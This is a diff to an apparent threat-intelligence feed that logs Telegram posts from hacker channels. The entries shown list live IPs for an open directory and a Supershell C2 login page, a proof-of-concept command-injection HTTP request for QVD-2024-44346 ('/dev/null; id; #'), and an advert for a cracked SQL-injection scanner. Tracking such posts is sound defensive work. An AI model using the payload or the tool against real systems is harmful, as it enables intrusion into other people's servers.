@@ -4634,6 +4634,42 @@
             "URLs": [
                 "ps://darkwebinformer.com/baymark-health-services-has-been-claimed-a-victim-to-ransomhub-ransomware/\n\nT"
             ]
+        },
+        {
+            "Message ID": 6101,
+            "discovered": "2024-10-29",
+            "post_title": "http://121.182.174.27:3000/ opendir",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "http://121.182.174.27:3000/"
+            ]
+        },
+        {
+            "Message ID": 6100,
+            "discovered": "2024-10-29",
+            "post_title": "http://185.80.130.66:8888/supershell/login",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "http://185.80.130.66:8888/supershell/login"
+            ]
+        },
+        {
+            "Message ID": 6099,
+            "discovered": "2024-10-29",
+            "post_title": "http://150.241.98.41/auth/login",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "http://150.241.98.41/auth/login"
+            ]
         }
     ],
     "RipperSec | 团队": [
@@ -7738,6 +7774,16 @@
             "Message ID": 2460,
             "discovered": "2024-10-29",
             "post_title": "QVD-2024-44346\n\nOPTIONS /dataBases/upgrademysqlstatus HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0\nContent-Type: application/json\nConnection: close\n \n{\"statusfile\":\"/dev/null; id; #\"}\n\nid\n\n#exploit #poc",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
+        },
+        {
+            "Message ID": 2461,
+            "discovered": "2024-10-29",
+            "post_title": "Sqli Dumper 🔥💥\n    automatically Scans the Websites on the internet using Dorks 🟢\nUSE it on rdp 🔺 \nThat version is cracked 🔥",
             "Attack Type": "Unknown",
             "Location": [
                 "N/A"
